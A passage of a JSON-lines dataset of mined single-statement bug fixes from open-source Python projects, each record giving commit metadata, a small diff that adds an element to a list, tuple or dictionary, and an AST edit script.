\"TSOT\" , \"TMOO\" ] : frames . extend ( self . getall ( key ) )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 20, 3, 44], [\",:,\", \"T\"], 6], [\"Insert\", [\"list\", 3, 20, 3, 44], [\"string:\\\"TMOO\\\"\", \"T\"], 7]]"}
{"project": "picard", "commit_sha": "2ae8122be20c7c2b6ec8aaca2522a2013933792c", "parent_sha": "bf2eceeea2878d7e91d32ef8cd41e8699a3aa921", "file_path": "picard/ui/options/plugins.py", "project_url": "https://github.com/phw/picard", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -636,7 +636,7 @@ class PluginsOptionsPage(OptionsPage):\n             parse_response_type=None,\n             priority=True,\n             important=True,\n-            queryargs={\"id\": plugin.module_name}\n+            queryargs={\"id\": plugin.module_name, \"version\": plugin.version.to_string(short=True)}\n         )\n \n     def download_handler(self, update, response, reply, error, plugin):\n", "before": "queryargs = { \"id\" : plugin . module_name }", "after": "queryargs = { \"id\" : plugin . module_name , \"version\" : plugin . version . to_string ( short = True ) }", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"dictionary\", 3, 23, 3, 49], [\",:,\", \"T\"], 2], [\"Insert\", [\"dictionary\", 3, 23, 3, 49], [\"pair\", \"N0\"], 3], [\"Insert\", \"N0\", [\"string:\\\"version\\\"\", \"T\"], 0], [\"Insert\", \"N0\", [\":::\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N2\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:to_string\", \"T\"], 2], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"keyword_argument\", \"N5\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2], [\"Insert\", \"N4\", [\"identifier:plugin\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:version\", \"T\"], 2], [\"Insert\", \"N5\", [\"identifier:short\", \"T\"], 0], [\"Insert\", \"N5\", [\"=:=\", \"T\"], 1], [\"Insert\", \"N5\", [\"true:True\", \"T\"], 2]]"}
{"project": "Nitrate", "commit_sha": "ff0a9b9e5a0a42b0a57ce72dee8949926b664826", "parent_sha": "a7521a8e00d985172df8d7d4a74b0e3cd420a874", "file_path": "tcms/integration/issuetracker/task.py", "project_url": "https://github.com/mfonism/Nitrate", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -13,7 +13,7 @@ def bugzilla_external_track(issue_tracker, issue):\n         cred = issue_tracker.credential\n         bz = bugzilla.Bugzilla(issue_tracker.api_url,\n                                user=cred['username'],\n-                               password=['password'])\n+                               password=cred['password'])\n         bz.add_external_tracker(\n             int(issue.issue_key), issue.case.pk,\n \n", "before": "bz = bugzilla . Bugzilla ( issue_tracker . api_url , user = cred [ 'username' ] , password = [ 'password' ] )", "after": "bz = bugzilla . Bugzilla ( issue_tracker . api_url , user = cred [ 'username' ] , password = cred [ 'password' ] )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"keyword_argument\", 3, 32, 3, 53], [\"subscript\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:cred\", \"T\"], 0], [\"Move\", \"N0\", [\"[:[\", 3, 41, 3, 42], 1], [\"Move\", \"N0\", [\"string:'password'\", 3, 42, 3, 52], 2], [\"Move\", \"N0\", [\"]:]\", 3, 52, 3, 53], 3], [\"Delete\", [\"list\", 3, 41, 3, 53]]]"}
{"project": "neutron", "commit_sha": "486e2f4eb5a02c98958582e366a4d6081ea897e0", "parent_sha": "4ae6790d82542738edbb531a829b60ff8a44a3fe", "file_path": "neutron/plugins/ml2/drivers/linuxbridge/agent/arp_protect.py", "project_url": "https://github.com/noironetworks/neutron", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -191,4 +191,4 @@ NAMESPACE = None\n \n def ebtables(comm):\n     execute = ip_lib.IPWrapper(NAMESPACE).netns.execute\n-    return execute(['ebtables'] + comm, run_as_root=True)\n+    return execute(['ebtables', '--concurrent'] + comm, run_as_root=True)\n", "before": "return execute ( [ 'ebtables' ] + comm , run_as_root = True )", "after": "return execute ( [ 'ebtables' , '--concurrent' ] + comm , run_as_root = True )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 20, 3, 32], [\",:,\", \"T\"], 2], [\"Insert\", [\"list\", 3, 20, 3, 32], [\"string:'--concurrent'\", \"T\"], 3]]"}
{"project": "ploy_fabric", "commit_sha": "69a6ac1bd654e91e7c47cb37e8dd12b109a7bd28", "parent_sha": "3f9dc1b9ba61342de2f2f88ad79d9aec6ddb67cf", "file_path": "mr/awsome/plain.py", "project_url": "https://github.com/ployground/ploy_fabric", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -89,6 +89,6 @@ def get_massagers():\n \n \n def get_masters(config):\n-    masters = config.get('plain-master', {})\n+    masters = config.get('plain-master', {'default': {}})\n     for master in masters:\n         yield Master(config, master)\n", "before": "masters = config . get ( 'plain-master' , { } )", "after": "masters = config . get ( 'plain-master' , { 'default' : { } } )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"dictionary\", 3, 42, 3, 44], [\"{:{\", \"T\"], 0], [\"Insert\", [\"dictionary\", 3, 42, 3, 44], [\"pair\", \"N0\"], 1], [\"Insert\", [\"dictionary\", 3, 42, 3, 44], [\"}:}\", \"T\"], 2], [\"Insert\", \"N0\", [\"string:'default'\", \"T\"], 0], [\"Insert\", \"N0\", [\":::\", \"T\"], 1], [\"Move\", \"N0\", [\"dictionary\", 3, 42, 3, 44], 2]]"}
{"project": "TheKeep", "commit_sha": "e556d257fbb5615f918a142f615920ed700fec7b", "parent_sha": "2c4ab448b8a94120b97cb8be3823e6d863039352", "file_path": "keep/collection/tests.py", "project_url": "https://github.com/emory-libraries/TheKeep", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1147,7 +1147,7 @@ class CollectionViewsTest(KeepTestCase):\n         response = self.client.get(suggest_url, {'term': '1000 rushd'})\n         solrquery.filter.assert_called_with(content_model=CollectionObject.COLLECTION_CONTENT_MODEL)\n         solrquery.field_limit.assert_called_with(['pid', 'source_id', 'title',\n-                                                        'archive_short_name', 'creator'])\n+                                                        'archive_short_name', 'creator', 'archive_id'])\n         solrquery.sort_by.assert_called_with('-score')\n         # search terms\n         solrquery.query.assert_called_with(['1000', 'rushd*'])\n", "before": "solrquery . field_limit . assert_called_with ( [ 'pid' , 'source_id' , 'title' , 'archive_short_name' , 'creator' ] )", "after": "solrquery . field_limit . assert_called_with ( [ 'pid' , 'source_id' , 'title' , 'archive_short_name' , 'creator' , 'archive_id' ] )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Move\", [\",:,\", 2, 56, 2, 57], [\"list\", 2, 50, 3, 89], 7], [\"Insert\", [\"list\", 2, 50, 3, 89], [\",:,\", \"T\"], 2], [\"Insert\", [\"list\", 2, 50, 3, 89], [\",:,\", \"T\"], 11], [\"Insert\", [\"list\", 2, 50, 3, 89], [\"string:'archive_id'\", \"T\"], 12], [\"Delete\", [\",:,\", 3, 77, 3, 78]]]"}
{"project": "distutils2", "commit_sha": "449602dcefc25e3724c8a16170f3bdcc62216386", "parent_sha": "cef41738e2ccbf0f740272683a3117201f9b8bff", "file_path": "distutils2/tests/test_command_register.py", "project_url": "https://github.com/crateio/distutils2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -195,7 +195,7 @@ class RegisterTestCase(support.TempdirManager,\n         # long_description is not reSt compliant\n \n         # empty metadata\n-        cmd = self._get_cmd({})\n+        cmd = self._get_cmd({'name': 'xxx', 'version': 'xxx'})\n         cmd.ensure_finalized()\n         cmd.strict = 1\n         inputs = RawInputs('1', 'tarek', 'y')\n", "before": "cmd = self . _get_cmd ( { } )", "after": "cmd = self . _get_cmd ( { 'name' : 'xxx' , 'version' : 'xxx' } )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"dictionary\", 3, 29, 3, 31], [\"pair\", \"N0\"], 1], [\"Insert\", [\"dictionary\", 3, 29, 3, 31], [\",:,\", \"T\"], 2], [\"Insert\", [\"dictionary\", 3, 29, 3, 31], [\"pair\", \"N1\"], 3], [\"Insert\", \"N0\", [\"string:'name'\", \"T\"], 0], [\"Insert\", \"N0\", [\":::\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'xxx'\", \"T\"], 2], [\"Insert\", \"N1\", [\"string:'version'\", \"T\"], 0], [\"Insert\", \"N1\", [\":::\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'xxx'\", \"T\"], 2]]"}
{"project": "distutils2", "commit_sha": "3248d7163b428ba9f325b33da69d7d1df4255d53", "parent_sha": "21c559dc80e086c13da1247d67836770100aca0c", "file_path": "distutils2/_backport/tests/test_pkgutil.py", "project_url": "https://github.com/crateio/distutils2", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -377,7 +377,7 @@ class TestPkgUtilPEP376(support.LoggingCatcher, support.WarningsCatcher,\n         # Lookup all distributions found in the ``sys.path``.\n         # This test could potentially pick up other installed distributions\n         fake_dists = [('grammar', '1.0a4'), ('choxie', '2.0.0.9'),\n-            ('towel-stuff', '0.1')]\n+                      ('towel-stuff', '0.1'), ('babar', '0.1')]\n         found_dists = []\n \n         # Verify the fake dists have been found.\n", "before": "fake_dists = [ ( 'grammar' , '1.0a4' ) , ( 'choxie' , '2.0.0.9' ) , ( 'towel-stuff' , '0.1' ) ]", "after": "fake_dists = [ ( 'grammar' , '1.0a4' ) , ( 'choxie' , '2.0.0.9' ) , ( 'towel-stuff' , '0.1' ) , ( 'babar' , '0.1' ) ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 2, 22, 3, 36], [\",:,\", \"T\"], 6], [\"Insert\", [\"list\", 2, 22, 3, 36], [\"tuple\", \"N0\"], 7], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N0\", [\"string:'babar'\", \"T\"], 1], [\"Insert\", \"N0\", [\",:,\", \"T\"], 2], [\"Insert\", \"N0\", [\"string:'0.1'\", \"T\"], 3], [\"Insert\", \"N0\", [\"):)\", \"T\"], 4]]"}
{"project": "eSim", "commit_sha": "73e306db40503eba8f80a3a3508aebe76081ea2b", "parent_sha": "7e471c072b18c3969ed5573dbe24923c2f678b5f", "file_path": "src/ngspiceSimulation/NgspiceWidget.py", "project_url": "https://github.com/rahulp13/eSim", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -15,7 +15,7 @@ class NgspiceWidget(QtGui.QWidget):\n         self.layout.addWidget(self.terminal)\n         \n         #Creating argument for process\n-        self.args = ['-into', str(self.terminal.winId()),'-e', self.command]\n+        self.args = ['-into', str(self.terminal.winId()),'-hold','-e', self.command]\n         self.process.start('xterm', self.args)\n         \n         \n", "before": "self . args = [ '-into' , str ( self . terminal . winId ( ) ) , '-e' , self . command ]", "after": "self . args = [ '-into' , str ( self . terminal . winId ( ) ) , '-hold' , '-e' , self . command ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 21, 3, 77], [\"string:'-hold'\", \"T\"], 5], [\"Insert\", [\"list\", 3, 21, 3, 77], [\",:,\", \"T\"], 6]]"}
{"project": "osg-test", "commit_sha": "c28e41c4b15bfadb862cbeff196554f0064f0036", "parent_sha": "1bfbbbbf4e0ca348284f45e49415785196a127db", "file_path": "osgtest/tests/test_550_condorce.py", "project_url": "https://github.com/opensciencegrid/osg-test", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -98,7 +98,7 @@ class TestCondorCE(osgunittest.OSGTestCase):\n \n     def test_03_ping(self):\n         self.check_write_creds()\n-        self.command += ['condor_ce_ping', 'WRITE', '-verbose']\n+        self.command += ['condor_ce_ping', 'WRITE', '-verbose', '-debug']\n         stdout, _, _ = core.check_system(self.command, 'ping using GSI and gridmap', user=True)\n         self.assertTrue(re.search(r'Authorized:\\s*TRUE', stdout), 'could not authorize with GSI')\n \n", "before": "self . command += [ 'condor_ce_ping' , 'WRITE' , '-verbose' ]", "after": "self . command += [ 'condor_ce_ping' , 'WRITE' , '-verbose' , '-debug' ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 25, 3, 64], [\",:,\", \"T\"], 6], [\"Insert\", [\"list\", 3, 25, 3, 64], [\"string:'-debug'\", \"T\"], 7]]"}
{"project": "pip", "commit_sha": "4cac29036f4afb0907d5f64e26b5416dd0aea93c", "parent_sha": "f29445b045ff79e68dfab871abab5a7504deae21", "file_path": "pip/download.py", "project_url": "https://github.com/jiahillegass/pip", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -348,7 +348,7 @@ def _download_url(resp, link, temp_location):\n         download_hash = md5()\n     try:\n         total_length = int(resp.info()['content-length'])\n-    except (ValueError, KeyError):\n+    except (ValueError, KeyError, TypeError):\n         total_length = 0\n     downloaded = 0\n     show_progress = total_length > 40*1000 or not total_length\n", "before": "try : total_length = int ( resp . info ( ) [ 'content-length' ] ) except ( ValueError , KeyError ) : total_length = 0", "after": "try : total_length = int ( resp . info ( ) [ 'content-length' ] ) except ( ValueError , KeyError , TypeError ) : total_length = 0", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 12, 3, 34], [\",:,\", \"T\"], 4], [\"Insert\", [\"tuple\", 3, 12, 3, 34], [\"identifier:TypeError\", \"T\"], 5]]"}
{"project": "pip", "commit_sha": "c6870b6f961445b2e5c537a17f5c999f28c95c4c", "parent_sha": "4abc4c6a227991722b0d0fadcfe90ba5de027cb9", "file_path": "pip/download.py", "project_url": "https://github.com/jiahillegass/pip", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -347,7 +347,7 @@ def _download_url(resp, link, temp_location):\n         download_hash = md5()\n     try:\n         total_length = int(resp.info()['content-length'])\n-    except (ValueError, KeyError):\n+    except (ValueError, KeyError, TypeError):\n         total_length = 0\n     downloaded = 0\n     show_progress = total_length > 40*1000 or not total_length\n", "before": "try : total_length = int ( resp . info ( ) [ 'content-length' ] ) except ( ValueError , KeyError ) : total_length = 0", "after": "try : total_length = int ( resp . info ( ) [ 'content-length' ] ) except ( ValueError , KeyError , TypeError ) : total_length = 0", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"tuple\", 3, 12, 3, 34], [\",:,\", \"T\"], 4], [\"Insert\", [\"tuple\", 3, 12, 3, 34], [\"identifier:TypeError\", \"T\"], 5]]"}
{"project": "scons", "commit_sha": "7a0f183867bfd687498103694967117a8a83b147", "parent_sha": "0d8eefb2a3c91f01e6a2a49eba8a04816b30e7e6", "file_path": "QMTest/TestRuntest.py", "project_url": "https://github.com/crossbuild/scons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -99,7 +99,7 @@ class TestRuntest(TestCommon):\n             'QMTest',\n         ]\n \n-        dirs = []\n+        dirs = [orig_cwd]\n         \n         spe = os.environ.get('SCONS_SOURCE_PATH_EXECUTABLE', orig_cwd)\n         for d in string.split(spe, os.pathsep):\n", "before": "dirs = [ ]", "after": "dirs = [ orig_cwd ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 16, 3, 18], [\"identifier:orig_cwd\", \"T\"], 1]]"}
{"project": "scons", "commit_sha": "83d08a9a537db5b73ba94f7335dc95fc0234d094", "parent_sha": "51e9e984731099786dde743516977aaf03db853a", "file_path": "QMTest/TestRuntest.py", "project_url": "https://github.com/crossbuild/scons", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -99,7 +99,7 @@ class TestRuntest(TestCommon):\n             'QMTest',\n         ]\n \n-        dirs = []\n+        dirs = [orig_cwd]\n         \n         spe = os.environ.get('SCONS_SOURCE_PATH_EXECUTABLE', orig_cwd)\n         for d in string.split(spe, os.pathsep):\n", "before": "dirs = [ ]", "after": "dirs = [ orig_cwd ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 16, 3, 18], [\"identifier:orig_cwd\", \"T\"], 1]]"}
{"project": "iterative-Random-Forest", "commit_sha": "b8c175992d5ef98355f1da83bbfb71ce297ecc79", "parent_sha": "a1fda4692143fae0e43755c8f679343ba30eb058", "file_path": "scikits/learn/utils/__init__.py", "project_url": "https://github.com/Yu-Group/iterative-Random-Forest", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -47,7 +47,7 @@ def check_arrays(*arrays, **options):\n     sparse_format = options.pop('sparse_format', None)\n-    if sparse_format not in ('csr', 'csc'):\n+    if sparse_format not in (None, 'csr', 'csc'):\n         raise ValueError('Unexpected sparse format: %r' % sparse_format)\n     copy = options.pop('copy', False)\n     if options:\n", "before": "if sparse_format not in ( 'csr' , 'csc' ) : raise ValueError ( 'Unexpected sparse format: %r' % sparse_format )", "after": "if sparse_format not in ( None , 'csr' , 'csc' ) : raise ValueError ( 'Unexpected sparse format: %r' % sparse_format )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Move\", [\"string:'csr'\", 1, 30, 1, 35], [\"tuple\", 1, 29, 1, 43], 2], [\"Insert\", [\"tuple\", 1, 29, 1, 43], [\"none:None\", \"T\"], 1], [\"Insert\", [\"tuple\", 1, 29, 1, 43], [\",:,\", \"T\"], 3]]"}
{"project": "iterative-Random-Forest", "commit_sha": "80745240da580503477001554cd8dec2a7287489", "parent_sha": "f8c19f9b1961630f394de3cb100a8cc30093d0b7", "file_path": "sklearn/feature_selection/tests/test_selector_mixin.py", "project_url": "https://github.com/Yu-Group/iterative-Random-Forest", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -17,7 +17,7 @@ def test_transform_linear_model():\n     for clf in (LogisticRegression(C=0.1),\n                 LinearSVC(C=0.01, dual=False),\n                 SGDClassifier(alpha=0.1, n_iter=10, shuffle=True, seed=0)):\n-        for thresh in (\".09*mean\", \"1e-5 * median\"):\n+        for thresh in (None, \".09*mean\", \"1e-5 * median\"):\n             for func in (np.array, sp.csr_matrix):\n                 X = func(iris.data)\n                 clf.set_params(penalty=\"l1\")\n", "before": "for thresh in ( \".09*mean\" , \"1e-5 * median\" ) : for func in ( np . array , sp . csr_matrix ) : X = func ( iris . data ) clf . set_params ( penalty = \"l1\" )", "after": "for thresh in ( None , \".09*mean\" , \"1e-5 * median\" ) : for func in ( np . array , sp . csr_matrix ) : X = func ( iris . data ) clf . set_params ( penalty = \"l1\" )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Move\", [\"string:\\\".09*mean\\\"\", 3, 24, 3, 34], [\"tuple\", 3, 23, 3, 52], 2], [\"Insert\", [\"tuple\", 3, 23, 3, 52], [\"none:None\", \"T\"], 1], [\"Insert\", [\"tuple\", 3, 23, 3, 52], [\",:,\", \"T\"], 3]]"}
{"project": "vsc-base", "commit_sha": "e60e8816e0963f5073ca89557be1f2851f44398e", "parent_sha": "09a7d18767e7ee7d1f439c3d208606cd42c68d4e", "file_path": "test/testing.py", "project_url": "https://github.com/hpcugent/vsc-base", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -59,7 +59,7 @@ class TestTesting(EnhancedTestCase):\n     def test_assertErrorRegex(self):\n         \"\"\"Tests for assertErrorRegex method.\"\"\"\n         testfile = '/no/such/file'\n-        self.assertErrorRegex(KeyError, \"foo\", {}.pop, 'foo')\n+        self.assertErrorRegex(KeyError, \"foo\", {'one': 1}.pop, 'foo')\n         # INCEPTION!\n         # id(0) should never throw any error\n         regex = \"Expected errors with .* should occur\"\n", "before": "self . assertErrorRegex ( KeyError , \"foo\" , { } . pop , 'foo' )", "after": "self . assertErrorRegex ( KeyError , \"foo\" , { 'one' : 1 } . pop , 'foo' )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"dictionary\", 3, 48, 3, 50], [\"pair\", \"N0\"], 1], [\"Insert\", \"N0\", [\"string:'one'\", \"T\"], 0], [\"Insert\", \"N0\", [\":::\", \"T\"], 1], [\"Insert\", \"N0\", [\"integer:1\", \"T\"], 2]]"}
{"project": "pyfluent", "commit_sha": "89c414c3ccfb25d1ce50e97dacdfc9154a0d3871", "parent_sha": "50943608cc8c5070fd735773d10daadd3647e7fa", "file_path": "pyfluent/logging.py", "project_url": "https://github.com/yosisa/pyfluent", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -32,7 +32,7 @@ class FluentFormatter(logging.Formatter):\n         super(FluentFormatter, self).__init__(fmt, datefmt)\n         self.exclude = [\n             'args', 'asctime', 'created', 'exc_info', 'levelno', 'msecs',\n-            'msg', 'relativeCreated', 'thread'\n+            'msg', 'relativeCreated', 'thread', 'message'\n         ]\n         self.hostname = socket.gethostname()\n \n", "before": "self . exclude = [ 'args' , 'asctime' , 'created' , 'exc_info' , 'levelno' , 'msecs' , 'msg' , 'relativeCreated' , 'thread' ]", "after": "self . exclude = [ 'args' , 'asctime' , 'created' , 'exc_info' , 'levelno' , 'msecs' , 'msg' , 'relativeCreated' , 'thread' , 'message' ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Move\", [\",:,\", 2, 19, 2, 20], [\"list\", 1, 24, 4, 10], 15], [\"Insert\", [\"list\", 1, 24, 4, 10], [\",:,\", \"T\"], 2], [\"Insert\", [\"list\", 1, 24, 4, 10], [\",:,\", \"T\"], 19], [\"Insert\", [\"list\", 1, 24, 4, 10], [\"string:'message'\", \"T\"], 20], [\"Delete\", [\",:,\", 3, 37, 3, 38]]]"}
{"project": "zeronimo", "commit_sha": "68cc4e39a464feb53a91eb047873d3a37d9bee64", "parent_sha": "4eb4880a443687c53e146fa78cc67e40d191c4c7", "file_path": "test.py", "project_url": "https://github.com/sublee/zeronimo", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -970,7 +970,7 @@ def test_fanout_by_other_types(left_type, right_type, socket, addr1, addr2):\n     worker = zeronimo.Worker(Application(), [worker_sock], worker_pub)\n     collector = zeronimo.Collector(collector_sub, b'xxx')\n     fanout = zeronimo.Fanout(fanout_sock, collector)\n-    with running([worker]):\n+    with running([worker, collector]):\n         assert \\\n             get_results(fanout.emit(b'anything', 'zeronimo')) == ['zeronimo']\n \n", "before": "with running ( [ worker ] ) : assert get_results ( fanout . emit ( b'anything' , 'zeronimo' ) ) == [ 'zeronimo' ]", "after": "with running ( [ worker , collector ] ) : assert get_results ( fanout . emit ( b'anything' , 'zeronimo' ) ) == [ 'zeronimo' ]", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 18, 3, 26], [\",:,\", \"T\"], 2], [\"Insert\", [\"list\", 3, 18, 3, 26], [\"identifier:collector\", \"T\"], 3]]"}
{"project": "coldfront", "commit_sha": "6b1ea3567005e9ed02ea99a173627e1b543b9e00", "parent_sha": "91ae1d9bb658ac7a05dd6b3f460b0746041866d5", "file_path": "coldfront/core/project/views.py", "project_url": "https://github.com/ubccr/coldfront", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -112,7 +112,7 @@ class ProjectDetailView(LoginRequiredMixin, UserPassesTestMixin, DetailView):\n                     Q(status__name__in=['Active', 'Expired',\n                                         'New', 'Renewal Requested',\n                                         'Payment Pending', 'Payment Requested',\n-                                        'Payment Declined', 'Paid']) &\n+                                        'Payment Declined', 'Paid','Denied']) &\n                     Q(allocationuser__user=self.request.user) &\n                     Q(allocationuser__status__name__in=['Active', ])\n                 ).distinct().order_by('-end_date')\n", "before": "Q ( status__name__in = [ 'Active' , 'Expired' , 'New' , 'Renewal Requested' , 'Payment Pending' , 'Payment Requested' , 'Payment Declined' , 'Paid' ] ) & Q ( allocationuser__user = self . request . user ) & Q ( allocationuser__status__name__in = [ 'Active' , ] )", "after": "Q ( status__name__in = [ 'Active' , 'Expired' , 'New' , 'Renewal Requested' , 'Payment Pending' , 'Payment Requested' , 'Payment Declined' , 'Paid' , 'Denied' ] ) & Q ( allocationuser__user = self . request . user ) & Q ( allocationuser__status__name__in = [ 'Active' , ] )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Move\", [\",:,\", 0, 49, 0, 50], [\"list\", 0, 40, 3, 68], 15], [\"Insert\", [\"list\", 0, 40, 3, 68], [\",:,\", \"T\"], 2], [\"Insert\", [\"list\", 0, 40, 3, 68], [\"string:'Denied'\", \"T\"], 4]]"}
{"project": "PyBNF", "commit_sha": "72a3faae44fb05c578be006833522847b75244f4", "parent_sha": "2f3a8a82b46d441e2b815fbd4a4ec3e96e5b4881", "file_path": "pybnf/algorithms.py", "project_url": "https://github.com/lanl/PyBNF", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -174,7 +174,7 @@ class Job:\n         #     res = FailedSimulation(self.params, self.job_id, 2, sys.exc_info())\n         if self.delete_folder:\n             try:\n-                run(['rm', '-rf'], check=True, timeout=60)\n+                run(['rm', '-rf', self.folder], check=True, timeout=60)\n             except CalledProcessError or TimeoutExpired:\n                 # fail flag set to 1 since timeout in this case is due to directory removal\n                 res = FailedSimulation(self.params, self.job_id, 1)\n", "before": "run ( [ 'rm' , '-rf' ] , check = True , timeout = 60 )", "after": "run ( [ 'rm' , '-rf' , self . folder ] , check = True , timeout = 60 )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 21, 3, 34], [\",:,\", \"T\"], 4], [\"Insert\", [\"list\", 3, 21, 3, 34], [\"attribute\", \"N0\"], 5], [\"Insert\", \"N0\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:folder\", \"T\"], 2]]"}
{"project": "pootle", "commit_sha": "ecf2b6d155aca2780a0e3b8383c5f88ede5f46c2", "parent_sha": "6b7bc7b31be1b63eefc5b8248091ff4ecad5c682", "file_path": "pootle/apps/pootle_project/models.py", "project_url": "https://github.com/iSCGroup/pootle", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -73,7 +73,7 @@ class ProjectURLMixin(object):\n \n     def get_absolute_url(self):\n-        return reverse('pootle-project-overview', args=[self.code])\n+        return reverse('pootle-project-overview', args=[self.code, ''])\n \n     def get_translate_url(self, **kwargs):\n         lang, proj, dir, fn = split_pootle_path(self.pootle_path)\n", "before": "return reverse ( 'pootle-project-overview' , args = [ self . code ] )", "after": "return reverse ( 'pootle-project-overview' , args = [ self . code , '' ] )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 2, 56, 2, 67], [\",:,\", \"T\"], 2], [\"Insert\", [\"list\", 2, 56, 2, 67], [\"string:''\", \"T\"], 3]]"}
{"project": "ajenti", "commit_sha": "82df4f1d988264b66661acf421f60ff7d455baba", "parent_sha": "6f5b8acd6f1e5f6871394f040f600a91e12deea6", "file_path": "ajenti/core/auth.py", "project_url": "https://github.com/cliftonclassroom/ajenti", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -86,5 +86,5 @@ class AuthManager(object):\n \n         templ = self.app.get_template('auth.xml')\n         templ.find('challenge').set('value', challenge)\n-        start_response('200 OK', [])\n+        start_response('200 OK', [('Content-type','text/html')])\n         return templ.render()\n", "before": "start_response ( '200 OK' , [ ] )", "after": "start_response ( '200 OK' , [ ( 'Content-type' , 'text/html' ) ] )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Insert\", [\"list\", 3, 34, 3, 36], [\"tuple\", \"N0\"], 1], [\"Insert\", \"N0\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N0\", [\"string:'Content-type'\", \"T\"], 1], [\"Insert\", \"N0\", [\",:,\", \"T\"], 2], [\"Insert\", \"N0\", [\"string:'text/html'\", \"T\"], 3], [\"Insert\", \"N0\", [\"):)\", \"T\"], 4]]"}
{"project": "ajenti-1", "commit_sha": "333873e3fcebe05081731d12194ef65f265280ee", "parent_sha": "5ccc1cd41ad1349b09b1e6b8a553d24d26280bc9", "file_path": "ajenti/plugins/samba/smbusers.py", "project_url": "https://github.com/cliftonclassroom/ajenti-1", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -31,6 +31,6 @@ class SambaUsers (object):\n         subprocess.call(['pdbedit', '-x', '-u', un])\n \n     def set_password(self, un, p):\n-        p = subprocess.Popen(['smbpasswd', '-s', un])\n+        p = subprocess.Popen(['smbpasswd', '-a', '-s', un])\n         p.communicate('%s\\n%s\\n' % (p, p))\n         return p.returncode == 0\n", "before": "p = subprocess . Popen ( [ 'smbpasswd' , '-s' , un ] )", "after": "p = subprocess . Popen ( [ 'smbpasswd' , '-a' , '-s' , un ] )", "sstub_pattern": "ADD_ELEMENTS_TO_ITERABLE", "edit_script": "[[\"Move\", [\"string:'-s'\", 3, 44, 3, 48], [\"list\", 3, 30, 3, 53], 4], [\"Insert\", [\"list\", 3, 30, 3, 53], [\"string:'-a'\", 